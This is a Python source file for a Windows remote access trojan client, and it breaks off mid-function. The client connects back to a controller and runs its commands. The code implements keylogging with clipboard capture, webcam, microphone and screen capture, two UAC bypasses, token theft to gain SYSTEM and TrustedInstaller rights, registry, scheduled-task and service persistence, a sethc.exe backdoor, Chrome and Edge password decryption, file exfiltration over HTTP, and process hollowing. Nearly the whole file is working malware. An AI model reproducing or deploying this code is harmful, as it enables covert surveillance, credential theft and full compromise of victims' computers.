# coding=utf-8
import base64
import ctypes
import datetime
import inspect
import json
import locale
import os
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import threading
import time
import wave
import winreg
from ctypes import wintypes
from ctypes.wintypes import DWORD, WORD, BYTE, LPVOID

import PyHook3
import cv2
import ntsecuritycon
import pefile
import psutil
import pyaudio
import pyautogui
import pythoncom
import requests
import win32api
import win32clipboard
import win32con
import win32crypt
import win32process
import win32profile
import win32security
import win32service
import win32ts
from Crypto.Cipher import AES


class Client(object):
    def __init__(self):
        self.socket = socket.socket()
        self.host = '127.0.0.1'
        self.port = 9999

    def connect(self):
        while self.socket.connect_ex((self.host, self.port)) != 0:
            time.sleep(5)

    def send(self, data):
        data = data.encode()
        self.socket.send(struct.pack('i', len(data)))
        self.socket.send(data)

    def recv(self):
        size = int(struct.unpack('i', self.socket.recv(4))[0])
        return self.socket.recv(size).decode()

    def send_file(self, filename):
        isfile = os.path.isfile(filename)
        self.socket.send(struct.pack('i', isfile))
        if isfile:
            self.socket.send(struct.pack('i', os.stat(filename).st_size))
            file = open(filename, 'rb')
            while True:
                data = file.read(1024)
                if not data:
                    break
                self.socket.send(data)
            file.close()

    def recv_file(self, filename):
        size = struct.unpack('i', self.socket.recv(4))[0]
        recv_size = 0
        file = open(filename, 'wb')
        while not recv_size == size:
            if size - recv_size > 1024:
                data = self.socket.recv(1024)
                recv_size += len(data)
            else:
                data = self.socket.recv(size - recv_size)
                recv_size = size
            file.write(data)
        file.close()

    def recv_commands(self):
        client_util = ClientUtil()
        self.send(str(os.getcwd()) + '> ')
        cmd = self.recv()
        executable = cmd.split(' ')[0]
        if cmd == 'null':
            pass
        elif cmd == 'kill':
            self.socket.close()
            sys.exit(0)
        elif hasattr(client_util, executable):
            func = getattr(client_util, executable)
            args = inspect.getfullargspec(func).args
            argc = len(args)
            if not argc:
                self.send(func())
            elif 'client_obj' in args:
                if argc == 1:
                    func(self)
                else:
                    func(self, cmd[len(executable) + 1:].strip())
            else:
                self.send(func(cmd[len(executable) + 1:].strip()))
        else:
            self.send(client_util.execute(cmd))


class ClientUtil:
    @staticmethod
    def upload(client_obj, filename):
        client_obj.recv_file(filename)

    @staticmethod
    def download(client_obj, filename):
        client_obj.send_file(filename)

    @staticmethod
    def screenshot(client_obj):
        filename = 'Screenshot.png'
        pyautogui.screenshot(filename)
        client_obj.send_file(filename)
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def webcam(client_obj):
        filename = 'Webcam.png'
        capture = cv2.VideoCapture(0)
        success, image = capture.read()
        if success:
            cv2.imwrite(filename, image)
            capture.release()
        client_obj.send_file(filename)
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def cd(path):
        try:
            if os.path.exists(path):
                os.chdir(path)
                return '[+] Change directory success'
            else:
                return '[-] Cannot find the path specified'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def run(command):
        try:
            if not command:
                return '[-] No process specified'
            process = subprocess.Popen(command)
            return '[+] Process created: ' + str(process.pid)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def idletime():
        try:
            return '[+] User has been idle for: ' + str(
                (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0) + ' seconds'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_fodhelper():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                executable_path = os.path.realpath(sys.executable)
                reg_path = r'Software\Classes\ms-settings\shell\open\command'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, executable_path)
                winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
                p = subprocess.Popen(r'C:\Windows\System32\fodhelper.exe', shell=True)
                p.communicate()
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
                winreg.DeleteValue(key, 'DelegateExecute')
                winreg.CloseKey(key)
                return '[+] Bypass UAC success'
            else:
                return '[-] Already elevated as administrator'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_clr():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                if not os.path.isfile('test.dll'):
                    return '[-] Missing DLL file'
                dll_path = os.path.abspath('test.dll')
                reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_EXPAND_SZ, dll_path)
                winreg.CloseKey(key)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'COR_PROFILER', 0, winreg.REG_SZ, '{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}')
                winreg.SetValueEx(key, 'COR_PROFILER_PATH', 0, winreg.REG_SZ, dll_path)
                winreg.SetValueEx(key, 'COR_ENABLE_PROFILING', 0, winreg.REG_SZ, '1')
                p = subprocess.Popen('mmc eventvwr.msc', shell=True)
                p.communicate()
                winreg.DeleteValue(key, 'COR_PROFILER')
                winreg.DeleteValue(key, 'COR_PROFILER_PATH')
                winreg.DeleteValue(key, 'COR_ENABLE_PROFILING')
                winreg.CloseKey(key)
                return '[+] Bypass UAC success'
            else:
                return '[-] Already elevated as administrator'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_system():
        try:
            enable_privilege('SeDebugPrivilege')
            create_process(get_pid('winlogon.exe'))
            return '[+] Get system privileges success'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_ti():
        try:
            enable_privilege('SeDebugPrivilege')
            start_service()
            create_process(get_pid('TrustedInstaller.exe'))
            return '[+] Get TrustedInstaller privileges success'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_admin():
        if not is_uac_enabled():
            return '[-] UAC is disabled'
        enable_privilege('SeDebugPrivilege')
        for proc in psutil.process_iter():
            try:
                process_name = proc.name()
                process_id = proc.pid
                if get_elevation_type(process_id) == win32security.TokenElevationTypeFull:
                    create_process(process_id)
                    return '[+] Steal token from {0} (PID: {1})'.format(process_name, process_id)
            except:
                pass
        return '[-] Cannot find any elevated processes'

    @staticmethod
    def persistence_registry():
        try:
            executable_path = os.path.realpath(sys.executable)
            key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                      r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                      win32con.KEY_ALL_ACCESS)
            win32api.RegSetValueEx(key, 'reverse_shell', 0, win32con.REG_SZ, executable_path)
            win32api.RegCloseKey(key)
            return '[+] Create registry key success'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_schtasks():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                executable_path = os.path.realpath(sys.executable)
                subprocess.Popen(
                    'schtasks.exe /create /tn reverse_shell /sc onlogon /ru system /rl highest /f /tr ' + executable_path,
                    shell=True)
                return '[+] Schedule task success'
            else:
                return '[-] Operation requires elevation'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_service():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                executable_path = os.path.realpath(sys.executable)
                cmd = subprocess.Popen(
                    'sc create reverse_shell binpath= "' + executable_path + '" start= auto',
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return '[+] Create service success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                            locale.getdefaultlocale()[1])
            else:
                return '[-] Operation requires elevation'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def setcritical():
        try:
            is_critical = ctypes.c_int(1)
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            process_handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, os.getpid())
            status = ctypes.windll.ntdll.NtSetInformationProcess(process_handle, 29, ctypes.byref(is_critical),
                                                                 ctypes.sizeof(ctypes.c_int))
            if not status:
                return '[+] Set critical process success'
            else:
                return '[-] Error: ' + str(status)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def poweroff():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.ZwShutdownSystem(2)

    @staticmethod
    def execute(command):
        try:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            result = str(cmd.stdout.read() + cmd.stderr.read(), locale.getdefaultlocale()[1])
            if not result:
                result = '[+] Command completed successfully\n'
            return result
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_user():
        try:
            create_process_in_user_session()
            return '[+] Process created in user session'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_admin():
        try:
            create_process_as_admin()
            return '[+] Process created as administrator'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def keylog_start():
        try:
            threading.Thread(target=Keylogger().start, daemon=True).start()
            return '[+] Keylogger started'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def keylog_stop(client_obj):
        filename = 'output.txt'
        client_obj.send_file(filename)
        if os.path.isfile(filename):
            os.remove(filename)
        subprocess.Popen(os.path.realpath(sys.executable))
        client_obj.socket.close()
        sys.exit(0)

    @staticmethod
    def record(client_obj, seconds):
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        filename = 'output.wav'
        try:
            try:
                RECORD_SECONDS = int(seconds)
            except:
                RECORD_SECONDS = 10
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            client_obj.send('[+] Start recording')
        except Exception as exception:
            client_obj.send('[-] Error: ' + str(exception))
            return
        try:
            frames = []
            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            f = wave.open(filename, 'wb')
            f.setnchannels(CHANNELS)
            f.setsampwidth(p.get_sample_size(FORMAT))
            f.setframerate(RATE)
            f.writeframes(b''.join(frames))
            f.close()
            client_obj.send_file(filename)
            if os.path.isfile(filename):
                os.remove(filename)
            client_obj.send('[+] Record success')
        except Exception as exception:
            client_obj.send('[-] Error: ' + str(exception))

    @staticmethod
    def replace_files():
        try:
            sys_dir = r'C:\Windows\System32'
            if os.path.isfile(sys_dir + r'\sethc.exe.bak'):
                return '[-] File already exists'
            cmd_list = [r'takeown /f %s\sethc.exe' % sys_dir,
                        r'icacls %s\sethc.exe /grant administrators:F' % sys_dir,
                        r'move {0}\sethc.exe {0}\sethc.exe.bak'.format(sys_dir),
                        r'copy {0}\cmd.exe {0}\sethc.exe'.format(sys_dir)]
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            return result
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def list_software():
        try:
            software_list = get_software_list(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY) + get_software_list(
                winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY) + get_software_list(winreg.HKEY_CURRENT_USER, 0)
            software_list.sort()
            width = [max(map(len, col)) for col in zip(*software_list)]
            result = ''
            for software in software_list:
                result += ' '.join(val.ljust(width) for val, width in zip(software, width)) + '\n'
            result += 'Number of installed apps: ' + str(len(software_list))
            return result
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def chrome_password():
        try:
            master_key = get_chrome_master_key()
            db = os.path.expanduser('~') + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
            return get_password(master_key, db)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def edge_password():
        try:
            master_key = get_edge_master_key()
            db = os.path.expanduser('~') + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
            return get_password(master_key, db)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def chrome_bookmark():
        try:
            file = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\Bookmarks'
            if not os.path.isfile(file):
                return '[-] No bookmark found'
            return get_bookmark(file)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def edge_bookmark():
        try:
            file = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks'
            if not os.path.isfile(file):
                return '[-] No bookmark found'
            return get_bookmark(file)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def chrome_history():
        try:
            db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\History'
            if not os.path.isfile(db):
                return '[-] No history found'
            return get_history(db)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def edge_history():
        try:
            db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\History'
            if not os.path.isfile(db):
                return '[-] No history found'
            return get_history(db)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def fsupload(client_obj, filename):
        try:
            if not os.path.isfile(filename):
                client_obj.send('[-] File not found')
                return
            with open(filename, 'rb') as f:
                response = requests.post('http://' + client_obj.host + ':8888/upload', files={'file': f})
                client_obj.send(response.text)
        except Exception as exception:
            client_obj.send('[-] Error: ' + str(exception))

    @staticmethod
    def fsdownload(client_obj, filename):
        try:
            response = requests.get('http://' + client_obj.host + ':8888/uploads/' + filename)
            with open(filename, 'wb') as f:
                f.write(response.content)
            client_obj.send('[+] File downloaded successfully')
        except Exception as exception:
            client_obj.send('[-] Error: ' + str(exception))

    @staticmethod
    def runpe():
        try:
            payload_executable = r'test.exe'
            target_executable = r'C:\Windows\explorer.exe'
            if not os.path.isfile(payload_executable) or not os.path.isfile(target_executable):
                return '[-] File not found'
            return process_hollowing(payload_executable, target_executable)
        except Exception as exception:
            return '[-] Error: ' + str(exception)


def get_time():
    return str(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))


class Keylogger(object):

    def __init__(self):
        self.window_name = ''
        with open('output.txt', 'a') as f:
            f.write('\n[+] ' + get_time() + ' Keylogger started' + '\n')
            f.close()

    def onKeyboardEvent(self, event):
        if 32 < event.Ascii < 127:
            data = chr(event.Ascii)
        else:
            if event.Key == 'V':
                try:
                    win32clipboard.OpenClipboard()
                    pasted_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    data = event.Key + ' ' + pasted_data
                except:
                    data = event.Key
            else:
                data = event.Key
        with open('output.txt', 'a') as f:
            if str(event.WindowName) != self.window_name:
                self.window_name = str(event.WindowName)
                f.write('\n\n[+] ' + get_time() + '\n' + self.window_name + '\n')
            f.write(data + ' ')
        f.close()
        return True

    def start(self):
        hook_manager = PyHook3.HookManager()
        hook_manager.KeyDown = self.onKeyboardEvent
        hook_manager.HookKeyboard()
        pythoncom.PumpMessages()


class STARTUPINFO(ctypes.Structure):
    _fields_ = (('cb', wintypes.DWORD),
                ('lpReserved', wintypes.LPWSTR),
                ('lpDesktop', wintypes.LPWSTR),
                ('lpTitle', wintypes.LPWSTR),
                ('dwX', wintypes.DWORD),
                ('dwY', wintypes.DWORD),
                ('dwXSize', wintypes.DWORD),
                ('dwYSize', wintypes.DWORD),
                ('dwXCountChars', wintypes.DWORD),
                ('dwYCountChars', wintypes.DWORD),
                ('dwFillAttribute', wintypes.DWORD),
                ('dwFlags', wintypes.DWORD),
                ('wShowWindow', wintypes.WORD),
                ('cbReserved2', wintypes.WORD),
                ('lpReserved2', wintypes.LPBYTE),
                ('hStdInput', wintypes.HANDLE),
                ('hStdOutput', wintypes.HANDLE),
                ('hStdError', wintypes.HANDLE))


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = (('hProcess', wintypes.HANDLE),
                ('hThread', wintypes.HANDLE),
                ('dwProcessId', wintypes.DWORD),
                ('dwThreadId', wintypes.DWORD))


def enable_privilege(privilege):
    privilege_id = win32security.LookupPrivilegeValue(None, privilege)
    new_privilege = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
    token_handle = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
    if token_handle:
        win32security.AdjustTokenPrivileges(token_handle, 0, new_privilege)


def start_service():
    handle_scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
    handle_service = win32service.OpenService(handle_scm, 'TrustedInstaller',
                                              win32service.SERVICE_START | win32service.SERVICE_QUERY_STATUS)
    status = win32service.QueryServiceStatus(handle_service)[1]
    if status == win32service.SERVICE_STOPPED:
        win32service.StartService(handle_service, None)
    win32service.CloseServiceHandle(handle_service)


def get_pid(process_name):
    for proc in psutil.process_iter():
        if process_name in proc.name():
            return proc.pid


def create_process(pid):
    si = STARTUPINFO()
    pi = PROCESS_INFORMATION()
    si.cb = ctypes.sizeof(si)
    si.lpDesktop = 'winsta0\\default'
    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
    executable_path = os.path.realpath(sys.executable)
    process_handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
    token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY)
    duplicate_token_handle = win32security.DuplicateTokenEx(token_handle, 3, win32con.MAXIMUM_ALLOWED,
                                                            win32security.TokenPrimary,
                                                            win32security.SECURITY_ATTRIBUTES())
    ctypes.windll.advapi32.CreateProcessWithTokenW(int(duplicate_token_handle), 1, executable_path, None,
                                                   creation_flags,
                                                   None, None, ctypes.byref(si), ctypes.byref(pi))


def get_elevation_type(pid):
    process_handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_QUERY)
    elevation_type = win32security.GetTokenInformation(token_handle, ntsecuritycon.TokenElevationType)
    return elevation_type


def is_uac_enabled():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
    return winreg.QueryValueEx(key, "EnableLUA")[0]


def create_process_in_user_session():
    executable_path = os.path.realpath(sys.executable)
    enable_privilege('SeTcbPrivilege')
    console_session_id = win32ts.WTSGetActiveConsoleSessionId()
    console_user_token = win32ts.WTSQueryUserToken(console_session_id)
    duplicate_token_handle = win32security.DuplicateTokenEx(console_user_token, 3, win32con.MAXIMUM_ALLOWED,
                                                            win32security.TokenPrimary,
                                                            win32security.SECURITY_ATTRIBUTES())
    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
    environment = win32profile.CreateEnvironmentBlock(duplicate_token_handle, False)
    win32process.CreateProcessAsUser(duplicate_token_handle, executable_path, None, None, None, False,
                                     creation_flags, environment, None, win32process.STARTUPINFO())


def create_process_as_admin():
    executable_path = os.path.realpath(sys.executable)
    enable_privilege('SeTcbPrivilege')
    console_session_id = win32ts.WTSGetActiveConsoleSessionId()
    console_user_token = win32ts.WTSQueryUserToken(console_session_id)
    duplicate_token_handle = win32security.DuplicateTokenEx(console_user_token, 3, win32con.MAXIMUM_ALLOWED,
                                                            win32security.TokenPrimary,
                                                            win32security.SECURITY_ATTRIBUTES())
    admin_token = win32security.GetTokenInformation(duplicate_token_handle, ntsecuritycon.TokenLinkedToken)
    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
    environment = win32profile.CreateEnvironmentBlock(admin_token, False)
    win32process.CreateProcessAsUser(admin_token, executable_path, None, None, None, False,
                                     creation_flags, environment, None, win32process.STARTUPINFO())


def get_software_list(hive, flag):
    reg = winreg.ConnectRegistry(None, hive)
    key = winreg.OpenKey(reg,
                         r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 0,
                         winreg.KEY_READ | flag)
    subkey = winreg.QueryInfoKey(key)[0]
    software_list = []
    for i in range(subkey):
        software = {}
        try:
            subkey_name = winreg.EnumKey(key, i)
            subkey = winreg.OpenKey(key, subkey_name)
            software['name'] = winreg.QueryValueEx(subkey, 'DisplayName')[0]
            try:
                software['version'] = winreg.QueryValueEx(subkey, 'DisplayVersion')[0]
            except EnvironmentError:
                software['version'] = 'undefined'
            try:
                software['publisher'] = winreg.QueryValueEx(subkey, 'Publisher')[0]
            except EnvironmentError:
                software['publisher'] = 'undefined'
            software_list.append(list(software.values()))
        except EnvironmentError:
            continue
    return software_list


def get_chrome_master_key():
    file = os.path.expanduser('~') + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
    with open(file, 'r') as f:
        local_state = json.loads(f.read().replace('\\', '\\\\'))
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]


def get_edge_master_key():
    file = os.path.expanduser('~') + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State'
    with open(file, 'r', encoding='utf-8') as f:
        local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]


def decrypt_password(buf, master_key):
    try:
        iv = buf[3:15]
        payload = buf[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        password = cipher.decrypt(payload)
        password = password[:-16].decode()
        return password
    except:
        return None


def get_password(master_key, db):
    shutil.copy2(db, 'vault.db')
    conn = sqlite3.connect('vault.db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    result = ''
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        password = decrypt_password(r[2], master_key)
        if username and password:
            result += 'URL: ' + url + '\nUsername: ' + username + '\nPassword: ' + password + '\n\n'
    cursor.close()
    conn.close()
    if os.path.isfile('vault.db'):
        os.remove('vault.db')
    return result


def convert_date(ft):
    utc = datetime.datetime.fromtimestamp(((10 * int(ft)) - 116444736000000000) / 10000000)
    return utc.strftime('%Y-%m-%d %H:%M:%S')


def sort(val):
    return val['name'].lower()


def preorder(tree, depth):
    depth += 1
    folders = []
    result = ''
    if tree:
        tree.sort(key=sort)
        for item in tree:
            try:
                children = len(item['children'])
            except:
                children = 0
            if children > 0:
                folders.append(item)
            else:
                result += 'name: ' + item['name'] + '\nurl: ' + item['url'] + '\n'
    folders.sort(key=sort)
    for folder in folders:
        result += '=' * 20 + folder['name'] + '=' * 20 + '\n'
        subtree = folder['children']
        result += preorder(subtree, depth)
    return result


def get_bookmark(file):
    with open(file, encoding='utf-8') as f:
        data = json.load(f)
        bookmarks = data['roots']['bookmark_bar']['children']
        result = ''
        result += '=' * 20 + 'Bookmark bar' + '=' * 20 + '\n'
        result += preorder(bookmarks, 0)
        result += '=' * 20 + 'Other' + '=' * 20 + '\n'
        bookmarks = data['roots']['other']['children']
        result += preorder(bookmarks, 0)
        return result


def get_history(db):
    shutil.copy2(db, 'history.db')
    conn = sqlite3.connect('history.db')
    cursor = conn.cursor()
    cursor.execute('SELECT url FROM urls')
    result = ''
    for url in cursor.fetchall():
        result += url[0] + os.linesep
    cursor.close()
    conn.close()
    if os.path.isfile('history.db'):
        os.remove('history.db')
    return result


DWORD64 = ctypes.c_ulonglong


class M128A(ctypes.Structure):
    _fields_ = [
        ('Low', DWORD64),
        ('High', DWORD64)
    ]


class XMM_SAVE_AREA32(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('ControlWord', WORD),
        ('StatusWord', WORD),
        ('TagWord', BYTE),
        ('Reserved1', BYTE),
        ('ErrorOpcode', WORD),
        ('ErrorOffset', DWORD),
        ('ErrorSelector', WORD),
        ('Reserved2', WORD),
        ('DataOffset', DWORD),
        ('DataSelector', WORD),
        ('Reserved3', WORD),
        ('MxCsr', DWORD),
        ('MxCsr_Mask', DWORD),
        ('FloatRegisters', M128A * 8),
        ('XmmRegisters', M128A * 16),
        ('Reserved4', BYTE * 96)
    ]


class DUMMYSTRUCTNAME(ctypes.Structure):
    _fields_ = [
        ('Header', M128A * 2),
        ('Legacy', M128A * 8),
        ('Xmm0', M128A),
        ('Xmm1', M128A),
        ('Xmm2', M128A),
        ('Xmm3', M128A),
        ('Xmm4', M128A),
        ('Xmm5', M128A),
        ('Xmm6', M128A),
        ('Xmm7', M128A),
        ('Xmm8', M128A),
        ('Xmm9', M128A),
        ('Xmm10', M128A),
        ('Xmm11', M128A),
        ('Xmm12', M128A),
        ('Xmm13', M128A),
        ('Xmm14', M128A),
        ('Xmm15', M128A),
    ]


class DUMMYUNIONNAME(ctypes.Structure):
    _fields_ = [
        ('FltSave', XMM_SAVE_AREA32),
        ('DummpyStruct', DUMMYSTRUCTNAME)
    ]


class CONTEXT(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        ('P1Home', DWORD64),
        ('P2Home', DWORD64),
        ('P3Home', DWORD64),
        ('P4Home', DWORD64),
        ('P5Home', DWORD64),
        ('P6Home', DWORD64),
        ('ContextFlags', DWORD),
        ('MxCsr', DWORD),
        ('SegCs', WORD),
        ('SegDs', WORD),
        ('SegEs', WORD),
        ('SegFs', WORD),
        ('SegGs', WORD),
        ('SegSs', WORD),
        ('EFlags', DWORD),
        ('Dr0', DWORD64),
        ('Dr1', DWORD64),
        ('Dr2', DWORD64),
        ('Dr3', DWORD64),
        ('Dr6', DWORD64),
        ('Dr7', DWORD64),
        ('Rax', DWORD64),
        ('Rcx', DWORD64),
        ('Rdx', DWORD64),
        ('Rbx', DWORD64),
        ('Rsp', DWORD64),
        ('Rbp', DWORD64),
        ('Rsi', DWORD64),
        ('Rdi', DWORD64),
        ('R8', DWORD64),
        ('R9', DWORD64),
        ('R10', DWORD64),
        ('R11', DWORD64),
        ('R12', DWORD64),
        ('R13', DWORD64),
        ('R14', DWORD64),
        ('R15', DWORD64),
        ('Rip', DWORD64),
        ('DUMMYUNIONNAME', DUMMYUNIONNAME),
        ('VectorRegister', M128A * 26),
        ('VectorControl', DWORD64),
        ('DebugControl', DWORD64),
        ('LastBranchToRip', DWORD64),
        ('LastBranchFromRip', DWORD64),
        ('LastExceptionToRip', DWORD64),
        ('LastExceptionFromRip', DWORD64),
    ]


def process_hollowing(payload_executable, target_executable):
    result = ''
    startup_info = STARTUPINFO()
    startup_info.cb = ctypes.sizeof(startup_info)
    process_info = PROCESS_INFORMATION()
    if ctypes.windll.kernel32.CreateProcessA(
            None,
            ctypes.create_string_buffer(bytes(target_executable, encoding='ascii')),
            None,
            None,
            False,
            0x00000004,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
    ) == 0:
        result += '[-] Error creating process: ' + target_executable + '\n'
        return result
    result += '[+] Process created in suspended state: {0} (PID: {1})'.format(target_executable,
                                                                              process_info.dwProcessId) + '\n'
    result += '[*] Reading {0} into memory'.format(payload_executable) + '\n'
    payload_pe = pefile.PE(payload_executable)
    with open(payload_executable, 'rb') as f:
        payload_data = f.read()
    result += '[*] Getting thread context\n'
    context = CONTEXT()
    context.ContextFlags = 0x10007
    if ctypes.windll.kernel32.GetThreadContext(process_info.hThread, ctypes.byref(context)) == 0:
        result += '[-] Error in GetThreadContext: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
        return result
    result += '[*] Reading base address of target process\n'
    target_image_base = LPVOID()
    if ctypes.windll.kernel32.ReadProcessMemory(
            process_info.hProcess,
            LPVOID(context.Rdx + 2 * ctypes.sizeof(ctypes.c_size_t)),
            ctypes.byref(target_image_base),
            ctypes.sizeof(LPVOID),
            None
    ) == 0:
        result += '[-] Error in ReadProcessMemory: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
        return result
    result += '[+] Base address of target process: {0}'.format(hex(target_image_base.value)) + '\n'

    result += '[*] Unmapping memory of target process\n'
    if target_image_base == payload_pe.OPTIONAL_HEADER.ImageBase:
        if ctypes.windll.ntdll.NtUnmapViewOfSection(process_info.hProcess, target_image_base) == 0:
            result += '[-] Error in NtUnmapViewOfSection: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
            return result
    result += '[*] Allocating memory in target process\n'
    ctypes.windll.kernel32.VirtualAllocEx.restype = LPVOID
    allocated_address = ctypes.windll.kernel32.VirtualAllocEx(
        process_info.hProcess,
        LPVOID(payload_pe.OPTIONAL_HEADER.ImageBase),
        payload_pe.OPTIONAL_HEADER.SizeOfImage,
        0x1000 | 0x2000,
        0x40
    )
    if allocated_address == 0:
        result += '[-] Error in VirtualAllocEx: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
        return result
    result += '[+] Allocated memory at: {0}'.format(hex(allocated_address)) + '\n'
    result += '[*] Writing payload headers to target process\n'
    if ctypes.windll.kernel32.WriteProcessMemory(process_info.hProcess,
                                                 LPVOID(allocated_address),
